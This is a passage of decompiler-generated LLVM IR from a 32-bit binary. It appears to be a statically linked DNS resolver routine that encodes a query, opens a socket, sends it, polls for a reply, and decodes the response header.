  %v2_80561c0 = inttoptr i32 %v1_80561c0 to i32*
  %v3_80561c0 = load i32, i32* %v2_80561c0, align 4
  %v5_80561c0 = icmp slt i32 %v3_80561c0, 0
  br i1 %v5_80561c0, label %dec_label_pc_805616f.dec_label_pc_8056206_crit_edge, label %dec_label_pc_80561c7

dec_label_pc_805616f.dec_label_pc_8056206_crit_edge: ; preds = %dec_label_pc_805616f
  %v0_8056206.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056206

dec_label_pc_80561c7:                             ; preds = %dec_label_pc_805616f
  store i32 %v3_80561c0, i32* %eax.global-to-local, align 4
  %v1_80561cb = load i32, i32* @global_var_8061bf8.553, align 8
  %v2_80561cb = sub i32 %v3_80561c0, %v1_80561cb
  %v8_80561cb = xor i32 %v1_80561cb, %v3_80561c0
  %v9_80561cb = xor i32 %v2_80561cb, %v3_80561c0
  %v10_80561cb = and i32 %v9_80561cb, %v8_80561cb
  %v11_80561cb = icmp slt i32 %v10_80561cb, 0
  %v13_80561cb = icmp slt i32 %v2_80561cb, 0
  %v2_80561d1 = icmp eq i1 %v13_80561cb, %v11_80561cb
  br i1 %v2_80561d1, label %dec_label_pc_8056206, label %dec_label_pc_80561d3

dec_label_pc_80561d3:                             ; preds = %dec_label_pc_80561c7
  %v2_80561d3 = add i32 %v0_80561bd, 12
  %v3_80561d3 = inttoptr i32 %v2_80561d3 to i32*
  store i32 %v3_80561c0, i32* %v3_80561d3, align 4
  %v1_80561d4 = add i32 %v0_80561bd, 8
  %v2_80561d4 = inttoptr i32 %v1_80561d4 to i32*
  store i32 1025, i32* %v2_80561d4, align 4
  %v1_80561d9 = add i32 %v0_80561bd, 4
  %v2_80561d9 = inttoptr i32 %v1_80561d9 to i32*
  store i32 ptrtoint (i32* @global_var_805af5c.554 to i32), i32* %v2_80561d9, align 4
  %v1_80561de = add i32 %v0_80561bd, 28
  %v2_80561de = inttoptr i32 %v1_80561de to i32*
  %v3_80561de = load i32, i32* %v2_80561de, align 4
  %v6_80561de = inttoptr i32 %v0_80561bd to i32*
  store i32 %v3_80561de, i32* %v6_80561de, align 4
  %v0_80561e2 = call i32 @__GI_strncat()
  store i32 %v0_80561e2, i32* %eax.global-to-local, align 4
  %v0_80561e7 = load i32, i32* @esp, align 4
  %v1_80561ea = add i32 %v0_80561e7, 8
  %v2_80561ea = inttoptr i32 %v1_80561ea to i32*
  store i32 1025, i32* %v2_80561ea, align 4
  %v1_80561ef = add i32 %v0_80561e7, 52
  %v2_80561ef = inttoptr i32 %v1_80561ef to i32*
  %v3_80561ef = load i32, i32* %v2_80561ef, align 4
  store i32 %v3_80561ef, i32* %edx.global-to-local, align 4
  %v1_80561f3 = mul i32 %v3_80561ef, 4
  %v2_80561f3 = add i32 %v1_80561f3, 134618072
  %v3_80561f3 = inttoptr i32 %v2_80561f3 to i32*
  %v4_80561f3 = load i32, i32* %v3_80561f3, align 4
  %v6_80561f3 = add i32 %v0_80561e7, 4
  %v7_80561f3 = inttoptr i32 %v6_80561f3 to i32*
  store i32 %v4_80561f3, i32* %v7_80561f3, align 4
  %v1_80561fa = add i32 %v0_80561e7, 28
  %v2_80561fa = inttoptr i32 %v1_80561fa to i32*
  %v3_80561fa = load i32, i32* %v2_80561fa, align 4
  %v6_80561fa = inttoptr i32 %v0_80561e7 to i32*
  store i32 %v3_80561fa, i32* %v6_80561fa, align 4
  %v0_80561fe = call i32 @__GI_strncat()
  store i32 %v0_80561fe, i32* %eax.global-to-local, align 4
  %v0_8056203 = load i32, i32* @esp, align 4
  %v1_8056203 = add i32 %v0_8056203, 16
  br label %dec_label_pc_8056206

dec_label_pc_8056206:                             ; preds = %dec_label_pc_805616f.dec_label_pc_8056206_crit_edge, %dec_label_pc_80561c7, %dec_label_pc_80561d3
  %v1_8056206 = phi i32 [ %v1_80561bd, %dec_label_pc_805616f.dec_label_pc_8056206_crit_edge ], [ %v1_80561bd, %dec_label_pc_80561c7 ], [ %v1_8056203, %dec_label_pc_80561d3 ]
  %v0_8056206 = phi i32 [ %v0_8056206.pre, %dec_label_pc_805616f.dec_label_pc_8056206_crit_edge ], [ %v3_80561c0, %dec_label_pc_80561c7 ], [ %v0_80561fe, %dec_label_pc_80561d3 ]
  %v2_8056206 = add i32 %v1_8056206, -4
  %v3_8056206 = inttoptr i32 %v2_8056206 to i32*
  store i32 %v0_8056206, i32* %v3_8056206, align 4
  %v0_8056207 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056207 = add i32 %v1_8056206, -8
  %v3_8056207 = inttoptr i32 %v2_8056207 to i32*
  store i32 %v0_8056207, i32* %v3_8056207, align 4
  %v1_8056208 = add i32 %v1_8056206, -12
  %v2_8056208 = inttoptr i32 %v1_8056208 to i32*
  store i32 1, i32* %v2_8056208, align 4
  %v1_805620a = add i32 %v1_8056206, 184
  store i32 %v1_805620a, i32* @eax, align 4
  %v2_8056211 = add i32 %v1_8056206, -16
  %v3_8056211 = inttoptr i32 %v2_8056211 to i32*
  store i32 %v1_805620a, i32* %v3_8056211, align 4
  %v2_8056212 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80560bc)
  store i32 %v2_8056212, i32* %eax.global-to-local, align 4
  %v0_8056217 = load i32, i32* @esp, align 4
  %v1_8056217 = add i32 %v0_8056217, 28
  %v2_8056217 = inttoptr i32 %v1_8056217 to i32*
  %v3_8056217 = load i32, i32* %v2_8056217, align 4
  store i32 %v3_8056217, i32* %eax.global-to-local, align 4
  %v1_805621b = add i32 %v0_8056217, 260
  %v2_805621b = inttoptr i32 %v1_805621b to i32*
  %v3_805621b = load i32, i32* %v2_805621b, align 4
  store i32 %v3_805621b, i32* @edx, align 4
  %v1_8056222 = add i32 %v0_8056217, 224
  %v2_8056222 = inttoptr i32 %v1_8056222 to i32*
  store i32 1, i32* %v2_8056222, align 4
  %v0_805622d = load i32, i32* %eax.global-to-local, align 4
  %v1_805622d = load i32, i32* @esp, align 4
  %v2_805622d = add i32 %v1_805622d, 216
  %v3_805622d = inttoptr i32 %v2_805622d to i32*
  store i32 %v0_805622d, i32* %v3_805622d, align 4
  %v1_8056239 = load i32, i32* @ebx, align 4
  %v2_8056239 = sub i32 512, %v1_8056239
  store i32 %v2_8056239, i32* %eax.global-to-local, align 4
  %v0_805623b = load i32, i32* @edx, align 4
  %v1_805623b = load i32, i32* @esp, align 4
  %v2_805623b = add i32 %v1_805623b, 220
  %v3_805623b = inttoptr i32 %v2_805623b to i32*
  store i32 %v0_805623b, i32* %v3_805623b, align 4
  %v0_8056242 = load i32, i32* @esp, align 4
  %v0_8056245 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056245 = add i32 %v0_8056242, 8
  %v3_8056245 = inttoptr i32 %v2_8056245 to i32*
  store i32 %v0_8056245, i32* %v3_8056245, align 4
  %v1_8056246 = load i32, i32* @ebx, align 4
  %v2_8056246 = add i32 %v1_8056246, %v2_805602e
  %v2_805624a = add i32 %v0_8056242, 4
  %v3_805624a = inttoptr i32 %v2_805624a to i32*
  store i32 %v2_8056246, i32* %v3_805624a, align 4
  %v1_805624b = add i32 %v0_8056242, 216
  store i32 %v1_805624b, i32* @eax, align 4
  %v3_8056252 = inttoptr i32 %v0_8056242 to i32*
  store i32 %v1_805624b, i32* %v3_8056252, align 4
  %v0_8056253 = call i32 @__encode_question()
  store i32 %v0_8056253, i32* %eax.global-to-local, align 4
  %v0_8056258 = load i32, i32* @esp, align 4
  %v2_805625b = icmp slt i32 %v0_8056253, 0
  store i32 %v0_8056253, i32* @esi, align 4
  br i1 %v2_805625b, label %dec_label_pc_80566c1, label %dec_label_pc_8056265

dec_label_pc_8056265:                             ; preds = %dec_label_pc_8056206
  %v1_8056265 = add i32 %v0_8056258, 172
  %v2_8056265 = inttoptr i32 %v1_8056265 to i16*
  store i16 2, i16* %v2_8056265, align 2
  %v1_805626f = load i32, i32* @esp, align 4
  %v2_805626f = add i32 %v1_805626f, -4
  %v3_805626f = inttoptr i32 %v2_805626f to i32*
  store i32 %v0_8056253, i32* %v3_805626f, align 4
  %v1_8056270 = add i32 %v1_805626f, 164
  store i32 %v1_8056270, i32* %eax.global-to-local, align 4
  %v2_8056277 = add i32 %v1_805626f, -8
  %v3_8056277 = inttoptr i32 %v2_8056277 to i32*
  store i32 %v1_8056270, i32* %v3_8056277, align 4
  %v1_8056278 = add i32 %v1_805626f, 32
  %v2_8056278 = inttoptr i32 %v1_8056278 to i32*
  %v3_8056278 = load i32, i32* %v2_8056278, align 4
  %v5_8056278 = add i32 %v1_805626f, -12
  %v6_8056278 = inttoptr i32 %v5_8056278 to i32*
  store i32 %v3_8056278, i32* %v6_8056278, align 4
  %v1_805627c = add i32 %v1_805626f, -16
  %v2_805627c = inttoptr i32 %v1_805627c to i32*
  store i32 10, i32* %v2_805627c, align 4
  %v5_805627e = call i32 @inet_pton(i32 -1, i8* %v4_805627e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805627e, i32* %eax.global-to-local, align 4
  %v0_8056283 = load i32, i32* @esp, align 4
  %v1_8056283 = add i32 %v0_8056283, 16
  %tmp47 = icmp slt i32 %v5_805627e, 1
  br i1 %tmp47, label %dec_label_pc_8056294, label %dec_label_pc_805628a

dec_label_pc_805628a:                             ; preds = %dec_label_pc_8056265
  %v1_805628a = add i32 %v0_8056283, 172
  %v2_805628a = inttoptr i32 %v1_805628a to i16*
  store i16 10, i16* %v2_805628a, align 2
  %v0_8056294.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056294

dec_label_pc_8056294:                             ; preds = %dec_label_pc_8056265, %dec_label_pc_805628a
  %v0_80562ab = phi i32 [ %v1_8056283, %dec_label_pc_8056265 ], [ %v0_8056294.pre, %dec_label_pc_805628a ]
  %v1_8056294 = add i32 %v0_80562ab, 156
  %v2_8056294 = inttoptr i32 %v1_8056294 to i16*
  %v3_8056294 = load i16, i16* %v2_8056294, align 2
  %v12_8056294 = icmp eq i16 %v3_8056294, 10
  %v1_805629d = icmp eq i1 %v12_8056294, false
  %v1_80562ab = add i32 %v0_80562ab, 158
  %v2_80562ab = inttoptr i32 %v1_80562ab to i16*
  store i16 13568, i16* %v2_80562ab, align 2
  %v0_80562b5 = load i32, i32* @esp, align 4
  br i1 %v1_805629d, label %dec_label_pc_80562ab, label %dec_label_pc_80562cb

dec_label_pc_80562ab:                             ; preds = %dec_label_pc_8056294
  %v1_80562b8 = add i32 %v0_80562b5, 32
  %v2_80562b8 = inttoptr i32 %v1_80562b8 to i32*
  %v3_80562b8 = load i32, i32* %v2_80562b8, align 4
  %v5_80562b8 = add i32 %v0_80562b5, -16
  %v6_80562b8 = inttoptr i32 %v5_80562b8 to i32*
  store i32 %v3_80562b8, i32* %v6_80562b8, align 4
  %v1_80562bc = call i32 @inet_addr(i32 -1)
  store i32 %v1_80562bc, i32* %eax.global-to-local, align 4
  %v1_80562c1 = load i32, i32* @esp, align 4
  %v2_80562c1 = add i32 %v1_80562c1, 176
  %v3_80562c1 = inttoptr i32 %v2_80562c1 to i32*
  store i32 %v1_80562bc, i32* %v3_80562c1, align 4
  %v0_80562c8 = load i32, i32* @esp, align 4
  %v1_80562c8 = add i32 %v0_80562c8, 16
  br label %dec_label_pc_80562cb

dec_label_pc_80562cb:                             ; preds = %dec_label_pc_8056294, %dec_label_pc_80562ab
  %v1_80562cb = phi i32 [ %v1_80562c8, %dec_label_pc_80562ab ], [ %v0_80562b5, %dec_label_pc_8056294 ]
  %v0_80562cb = load i32, i32* @ecx, align 4
  %v2_80562cb = add i32 %v1_80562cb, -4
  %v3_80562cb = inttoptr i32 %v2_80562cb to i32*
  store i32 %v0_80562cb, i32* %v3_80562cb, align 4
  %v1_80562cc = add i32 %v1_80562cb, -8
  %v2_80562cc = inttoptr i32 %v1_80562cc to i32*
  store i32 17, i32* %v2_80562cc, align 4
  %v1_80562ce = add i32 %v1_80562cb, -12
  %v2_80562ce = inttoptr i32 %v1_80562ce to i32*
  store i32 2, i32* %v2_80562ce, align 4
  %v1_80562d0 = add i32 %v1_80562cb, 156
  %v2_80562d0 = inttoptr i32 %v1_80562d0 to i16*
  %v3_80562d0 = load i16, i16* %v2_80562d0, align 2
  %v4_80562d0 = zext i16 %v3_80562d0 to i32
  store i32 %v4_80562d0, i32* %eax.global-to-local, align 4
  %v2_80562d8 = add i32 %v1_80562cb, -16
  %v3_80562d8 = inttoptr i32 %v2_80562d8 to i32*
  store i32 %v4_80562d0, i32* %v3_80562d8, align 4
  %v3_80562d9 = call i32 @socket(i32 -1, i32 %v15_80560bc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80562d9, i32* %eax.global-to-local, align 4
  %v1_80562de = load i32, i32* @esp, align 4
  %v2_80562de = add i32 %v1_80562de, 36
  %v3_80562de = inttoptr i32 %v2_80562de to i32*
  store i32 %v3_80562d9, i32* %v3_80562de, align 4
  %v0_80562e2 = load i32, i32* @esp, align 4
  %v1_80562e2 = add i32 %v0_80562e2, 16
  %v0_80562e5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80562e5 = icmp slt i32 %v0_80562e5, 0
  br i1 %v2_80562e5, label %dec_label_pc_8056312, label %dec_label_pc_80562e9

dec_label_pc_80562e9:                             ; preds = %dec_label_pc_80562cb
  %v1_80562e9 = add i32 %v0_80562e2, 172
  store i32 %v1_80562e9, i32* %eax.global-to-local, align 4
  %v0_80562f0 = load i32, i32* @edx, align 4
  %v2_80562f0 = add i32 %v0_80562e2, 12
  %v3_80562f0 = inttoptr i32 %v2_80562f0 to i32*
  store i32 %v0_80562f0, i32* %v3_80562f0, align 4
  %v1_80562f1 = add i32 %v0_80562e2, 8
  %v2_80562f1 = inttoptr i32 %v1_80562f1 to i32*
  store i32 28, i32* %v2_80562f1, align 4
  %v0_80562f3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80562f3 = add i32 %v0_80562e2, 4
  %v3_80562f3 = inttoptr i32 %v2_80562f3 to i32*
  store i32 %v0_80562f3, i32* %v3_80562f3, align 4
  %v1_80562f4 = add i32 %v0_80562e2, 36
  %v2_80562f4 = inttoptr i32 %v1_80562f4 to i32*
  %v3_80562f4 = load i32, i32* %v2_80562f4, align 4
  %v6_80562f4 = inttoptr i32 %v0_80562e2 to i32*
  store i32 %v3_80562f4, i32* %v6_80562f4, align 4
  %v3_80562f8 = call i32 @__libc_connect(i32 -1, i32 %v15_80560bc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80562f8, i32* %eax.global-to-local, align 4
  %v0_80562fd = load i32, i32* @esp, align 4
  %v2_8056300 = icmp slt i32 %v3_80562f8, 0
  %v1_8056302 = icmp eq i1 %v2_8056300, false
  br i1 %v1_8056302, label %dec_label_pc_805631b, label %dec_label_pc_8056304

dec_label_pc_8056304:                             ; preds = %dec_label_pc_80562e9
  %v1_8056304 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8056304, i32* %eax.global-to-local, align 4
  %v1_8056309 = inttoptr i32 %v1_8056304 to i32*
  %v2_8056309 = load i32, i32* %v1_8056309, align 4
  %v11_8056309 = icmp eq i32 %v2_8056309, 101
  %v0_805667b.pre = load i32, i32* @esp, align 4
  br i1 %v11_8056309, label %dec_label_pc_805667b, label %dec_label_pc_8056312

dec_label_pc_8056312:                             ; preds = %dec_label_pc_8056304, %dec_label_pc_80562cb
  %v17_8056312 = phi i32 [ %v1_80562e2, %dec_label_pc_80562cb ], [ %v0_805667b.pre, %dec_label_pc_8056304 ]
  %v1_8056312 = add i32 %v17_8056312, 28
  %v2_8056312 = inttoptr i32 %v1_8056312 to i32*
  %v3_8056312 = load i32, i32* %v2_8056312, align 4
  %v4_8056312 = add i32 %v3_8056312, 1
  store i32 %v4_8056312, i32* %v2_8056312, align 4
  br label %dec_label_pc_805669c.backedge

dec_label_pc_805631b:                             ; preds = %dec_label_pc_80562e9
  %v1_805631b = add i32 %v0_80562fd, 12
  %v2_805631b = inttoptr i32 %v1_805631b to i32*
  store i32 0, i32* %v2_805631b, align 4
  %v0_805631d = load i32, i32* @ebx, align 4
  %v1_805631d = load i32, i32* @esi, align 4
  %v2_805631d = add i32 %v1_805631d, %v0_805631d
  store i32 %v2_805631d, i32* %eax.global-to-local, align 4
  %v2_8056320 = add i32 %v0_80562fd, 8
  %v3_8056320 = inttoptr i32 %v2_8056320 to i32*
  store i32 %v2_805631d, i32* %v3_8056320, align 4
  %v2_8056321 = add i32 %v0_80562fd, 4
  %v3_8056321 = inttoptr i32 %v2_8056321 to i32*
  store i32 %v2_805602e, i32* %v3_8056321, align 4
  %v1_8056322 = add i32 %v0_80562fd, 36
  %v2_8056322 = inttoptr i32 %v1_8056322 to i32*
  %v3_8056322 = load i32, i32* %v2_8056322, align 4
  %v6_8056322 = inttoptr i32 %v0_80562fd to i32*
  store i32 %v3_8056322, i32* %v6_8056322, align 4
  %v4_8056326 = call i32 @__libc_send(i32 -1, i32 %v15_80560bc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056326, i32* %eax.global-to-local, align 4
  %v0_805632b = load i32, i32* @esp, align 4
  %v1_805632b = add i32 %v0_805632b, 36
  %v2_805632b = inttoptr i32 %v1_805632b to i32*
  %v3_805632b = load i32, i32* %v2_805632b, align 4
  store i32 %v3_805632b, i32* %eax.global-to-local, align 4
  %v1_805632f = add i32 %v0_805632b, 232
  %v2_805632f = inttoptr i32 %v1_805632f to i16*
  store i16 1, i16* %v2_805632f, align 2
  %v0_8056339 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056339 = load i32, i32* @esp, align 4
  %v2_8056339 = add i32 %v1_8056339, 228
  %v3_8056339 = inttoptr i32 %v2_8056339 to i32*
  store i32 %v0_8056339, i32* %v3_8056339, align 4
  %v0_8056340 = load i32, i32* @esp, align 4
  %v1_8056343 = add i32 %v0_8056340, 8
  %v2_8056343 = inttoptr i32 %v1_8056343 to i32*
  store i32 10000, i32* %v2_8056343, align 4
  %v1_8056348 = add i32 %v0_8056340, 4
  %v2_8056348 = inttoptr i32 %v1_8056348 to i32*
  store i32 1, i32* %v2_8056348, align 4
  %v1_805634a = add i32 %v0_8056340, 228
  store i32 %v1_805634a, i32* %eax.global-to-local, align 4
  %v3_8056351 = inttoptr i32 %v0_8056340 to i32*
  store i32 %v1_805634a, i32* %v3_8056351, align 4
  %v0_8056352 = call i32 @__libc_poll()
  store i32 %v0_8056352, i32* %eax.global-to-local, align 4
  %v0_8056357 = load i32, i32* @esp, align 4
  %v1_8056357 = add i32 %v0_8056357, 16
  %tmp48 = icmp slt i32 %v0_8056352, 1
  br i1 %tmp48, label %dec_label_pc_805667b, label %dec_label_pc_8056362

dec_label_pc_8056362:                             ; preds = %dec_label_pc_805631b
  %v1_8056362 = add i32 %v0_8056357, 12
  %v2_8056362 = inttoptr i32 %v1_8056362 to i32*
  store i32 0, i32* %v2_8056362, align 4
  %v1_8056364 = add i32 %v0_8056357, 8
  %v2_8056364 = inttoptr i32 %v1_8056364 to i32*
  store i32 512, i32* %v2_8056364, align 4
  %v2_8056369 = add i32 %v0_8056357, 4
  %v3_8056369 = inttoptr i32 %v2_8056369 to i32*
  store i32 %v2_805602e, i32* %v3_8056369, align 4
  %v1_805636a = add i32 %v0_8056357, 36
  %v2_805636a = inttoptr i32 %v1_805636a to i32*
  %v3_805636a = load i32, i32* %v2_805636a, align 4
  %v6_805636a = inttoptr i32 %v0_8056357 to i32*
  store i32 %v3_805636a, i32* %v6_805636a, align 4
  %v4_805636e = call i32 @__libc_recv(i32 -1, i32 %v15_80560bc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805636e, i32* @eax, align 4
  %v1_8056373 = load i32, i32* @esp, align 4
  %v2_8056373 = add i32 %v1_8056373, 32
  %v3_8056373 = inttoptr i32 %v2_8056373 to i32*
  store i32 %v4_805636e, i32* %v3_8056373, align 4
  %v0_8056377 = load i32, i32* @esp, align 4
  %v1_8056377 = add i32 %v0_8056377, 16
  %v7_805637d = icmp sgt i32 %v4_805636e, 11
  br i1 %v7_805637d, label %dec_label_pc_8056383, label %dec_label_pc_8056630

dec_label_pc_8056383:                             ; preds = %dec_label_pc_8056362
  %v0_8056383 = load i32, i32* @ebx, align 4
  %v2_8056383 = add i32 %v0_8056377, 12
  %v3_8056383 = inttoptr i32 %v2_8056383 to i32*
  store i32 %v0_8056383, i32* %v3_8056383, align 4
  %v0_8056384 = load i32, i32* @ebx, align 4
  %v2_8056384 = add i32 %v0_8056377, 8
  %v3_8056384 = inttoptr i32 %v2_8056384 to i32*
  store i32 %v0_8056384, i32* %v3_8056384, align 4
  %v1_8056385 = add i32 %v0_8056377, 84
  store i32 %v1_8056385, i32* %eax.global-to-local, align 4
  %v2_8056389 = add i32 %v0_8056377, 4
  %v3_8056389 = inttoptr i32 %v2_8056389 to i32*
  store i32 %v1_8056385, i32* %v3_8056389, align 4
  %v3_805638a = inttoptr i32 %v0_8056377 to i32*
  store i32 %v2_805602e, i32* %v3_805638a, align 4
  %v0_805638b = call i32 @__decode_header()
  store i32 %v0_805638b, i32* %eax.global-to-local, align 4
  %v0_8056390 = load i32, i32* @esp, align 4
  %v1_8056390 = add i32 %v0_8056390, 84
  %v2_8056390 = inttoptr i32 %v1_8056390 to i32*
  %v3_8056390 = load i32, i32* %v2_8056390, align 4
  store i32 %v3_8056390, i32* %edx.global-to-local, align 4
  %v2_8056394 = add i32 %v0_8056390, 60
  %v3_8056394 = inttoptr i32 %v2_8056394 to i32*
  store i32 %v3_8056390, i32* %v3_8056394, align 4
  %v0_8056398 = load i32, i32* @esp, align 4
  %v1_8056398 = add i32 %v0_8056398, 16
  %v1_805639b = add i32 %v0_8056398, 72
  %v2_805639b = inttoptr i32 %v1_805639b to i32*
  %v3_805639b = load i32, i32* %v2_805639b, align 4
  store i32 %v3_805639b, i32* @eax, align 4
  %v0_805639f = load i32, i32* %edx.global-to-local, align 4
  %v12_805639f = icmp eq i32 %v0_805639f, %v3_805639b
  %v1_80563a1 = icmp eq i1 %v12_805639f, false
  br i1 %v1_80563a1, label %dec_label_pc_8056630, label %dec_label_pc_80563a7

dec_label_pc_80563a7:                             ; preds = %dec_label_pc_8056383
  %v1_80563a7 = add i32 %v0_8056398, 88
  %v2_80563a7 = inttoptr i32 %v1_80563a7 to i32*
  %v3_80563a7 = load i32, i32* %v2_80563a7, align 4
  %v4_80563a7 = icmp eq i32 %v3_80563a7, 0
  br i1 %v4_80563a7, label %dec_label_pc_8056630, label %dec_label_pc_80563b2

dec_label_pc_80563b2:                             ; preds = %dec_label_pc_80563a7
  %v1_80563b2 = add i32 %v0_8056398, 112
  %v2_80563b2 = inttoptr i32 %v1_80563b2 to i32*
  %v3_80563b2 = load i32, i32* %v2_80563b2, align 4
  store i32 %v3_80563b2, i32* @eax, align 4
  %v9_80563b6 = icmp eq i32 %v3_80563b2, 3
  %v1_80563b9 = icmp eq i1 %v9_80563b6, false
  br i1 %v1_80563b9, label %dec_label_pc_8056421, label %dec_label_pc_80563bb

dec_label_pc_80563bb:                             ; preds = %dec_label_pc_80563b2
  %v1_80563bb = add i32 %v0_8056398, 67
  %v2_80563bb = inttoptr i32 %v1_80563bb to i8*
  %v3_80563bb = load i8, i8* %v2_80563bb, align 1
  %v4_80563bb = icmp eq i8 %v3_80563bb, 0
  %v1_80563c0 = icmp eq i1 %v4_80563bb, false
  br i1 %v1_80563c0, label %dec_label_pc_8056411, label %dec_label_pc_80563c2

dec_label_pc_80563c2:                             ; preds = %dec_label_pc_80563bb
  %v0_80563c2 = load i32, i32* @ecx, align 4
  %v2_80563c2 = add i32 %v0_8056398, 12
  %v3_80563c2 = inttoptr i32 %v2_80563c2 to i32*
  store i32 %v0_80563c2, i32* %v3_80563c2, align 4
  %v1_80563c3 = add i32 %v0_8056398, 8
  %v2_80563c3 = inttoptr i32 %v1_80563c3 to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v2_80563c3, align 4
  %v1_80563c8 = add i32 %v0_8056398, 4
  %v2_80563c8 = inttoptr i32 %v1_80563c8 to i32*
  store i32 134565087, i32* %v2_80563c8, align 4
  %v1_80563cd = add i32 %v0_8056398, 200
  store i32 %v1_80563cd, i32* @esi, align 4
  %v3_80563d4 = inttoptr i32 %v0_8056398 to i32*
  store i32 %v1_80563cd, i32* %v3_80563d4, align 4
  %v2_80563d5 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80560bc)
  store i32 %v2_80563d5, i32* %eax.global-to-local, align 4
  %v0_80563da = load i32, i32* @esp, align 4
  %v1_80563da = inttoptr i32 %v0_80563da to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v1_80563da, align 4
  %v1_80563e1 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80563e1, i32* %eax.global-to-local, align 4
  %v0_80563e6 = load i32, i32* @global_var_8061bf8.553, align 8
  store i32 %v0_80563e6, i32* %ebx.global-to-local, align 4
  %v0_80563ec = load i32, i32* @esp, align 4
  %v1_80563ec = inttoptr i32 %v0_80563ec to i32*
  %v2_80563ec = load i32, i32* %v1_80563ec, align 4
  store i32 %v2_80563ec, i32* @eax, align 4
  %v3_80563ec = add i32 %v0_80563ec, 4
  %v1_80563ed = inttoptr i32 %v3_80563ec to i32*
  %v2_80563ed = load i32, i32* %v1_80563ed, align 4
  store i32 %v2_80563ed, i32* %edx.global-to-local, align 4
  %v1_80563ee = add i32 %v0_80563e6, -1
  store i32 %v1_80563ee, i32* @ebx, align 4
  store i32 1, i32* %v1_80563ed, align 4
  %v0_80563f1 = load i32, i32* @esi, align 4
  store i32 %v0_80563f1, i32* %v1_80563ec, align 4
  %v2_80563f2 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80560bc)
  store i32 %v2_80563f2, i32* %eax.global-to-local, align 4
  %v0_80563f7 = load i32, i32* @esp, align 4
  %v1_80563fa = add i32 %v0_80563f7, 52
  %v2_80563fa = inttoptr i32 %v1_80563fa to i32*
  %v3_80563fa = load i32, i32* %v2_80563fa, align 4
  %v4_80563fa = load i32, i32* @ebx, align 4
  %v5_80563fa = sub i32 %v3_80563fa, %v4_80563fa
  %v11_80563fa = xor i32 %v4_80563fa, %v3_80563fa
  %v12_80563fa = xor i32 %v5_80563fa, %v3_80563fa
  %v13_80563fa = and i32 %v12_80563fa, %v11_80563fa
  %v14_80563fa = icmp slt i32 %v13_80563fa, 0
  %v16_80563fa = icmp slt i32 %v5_80563fa, 0
  %v2_80563fe = icmp eq i1 %v16_80563fa, %v14_80563fa
  br i1 %v2_80563fe, label %dec_label_pc_8056411, label %dec_label_pc_8056400

dec_label_pc_8056400:                             ; preds = %dec_label_pc_80563c2
  %v1_8056400 = add i32 %v0_80563f7, 60
  %v2_8056400 = inttoptr i32 %v1_8056400 to i32*
  %v3_8056400 = load i32, i32* %v2_8056400, align 4
  store i32 %v3_8056400, i32* %edx.global-to-local, align 4
  %v3_8056404 = load i32, i32* %v2_80563fa, align 4
  %v4_8056404 = add i32 %v3_8056404, 1
  store i32 %v4_8056404, i32* %v2_80563fa, align 4
  %v0_8056408 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056408 = load i32, i32* @esp, align 4
  %v2_8056408 = add i32 %v1_8056408, 56
  %v3_8056408 = inttoptr i32 %v2_8056408 to i32*
  store i32 %v0_8056408, i32* %v3_8056408, align 4
  br label %dec_label_pc_805669c.backedge

dec_label_pc_8056411:                             ; preds = %dec_label_pc_80563c2, %dec_label_pc_80563bb
  %v0_8056411 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056411, i32* %eax.global-to-local, align 4
  %v1_8056416 = inttoptr i32 %v0_8056411 to i32*
  store i32 1, i32* %v1_8056416, align 4
  br label %dec_label_pc_80566d4

dec_label_pc_8056421:                             ; preds = %dec_label_pc_80563b2
  %v1_8056421 = icmp eq i32 %v3_80563b2, 0
  %v1_8056423 = icmp eq i1 %v1_8056421, false
  br i1 %v1_8056423, label %dec_label_pc_8056630, label %dec_label_pc_8056429

dec_label_pc_8056429:                             ; preds = %dec_label_pc_8056421
  %v1_8056429 = add i32 %v0_8056398, 120
  %v2_8056429 = inttoptr i32 %v1_8056429 to i32*
  %v3_8056429 = load i32, i32* %v2_8056429, align 4
  %tmp49 = icmp slt i32 %v3_8056429, 1
  br i1 %tmp49, label %dec_label_pc_8056439, label %dec_label_pc_8056430

dec_label_pc_8056430:                             ; preds = %dec_label_pc_8056429
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8056458

dec_label_pc_8056439:                             ; preds = %dec_label_pc_8056429
  %v0_8056439 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056439, i32* %eax.global-to-local, align 4
  %v1_805643e = inttoptr i32 %v0_8056439 to i32*
  store i32 4, i32* %v1_805643e, align 4
  br label %dec_label_pc_80566d4

dec_label_pc_8056449:                             ; preds = %dec_label_pc_8056458
  %v2_8056449 = add i32 %v0_8056460, -4
  %v3_8056449 = inttoptr i32 %v2_8056449 to i32*
  store i32 %v0_8056449, i32* %v3_8056449, align 4
  %v0_805644a = load i32, i32* @ebx, align 4
  %v1_805644a = add i32 %v0_805644a, 1
  store i32 %v1_805644a, i32* @ebx, align 4
  %v0_805644b = load i32, i32* @eax, align 4
  %v2_805644b = add i32 %v0_8056460, -8
  %v3_805644b = inttoptr i32 %v2_805644b to i32*
  store i32 %v0_805644b, i32* %v3_805644b, align 4
  %v0_805644c = load i32, i32* @esi, align 4
  %v2_805644c = add i32 %v0_8056460, -12
  %v3_805644c = inttoptr i32 %v2_805644c to i32*
  store i32 %v0_805644c, i32* %v3_805644c, align 4
  %v2_805644d = add i32 %v0_8056460, -16
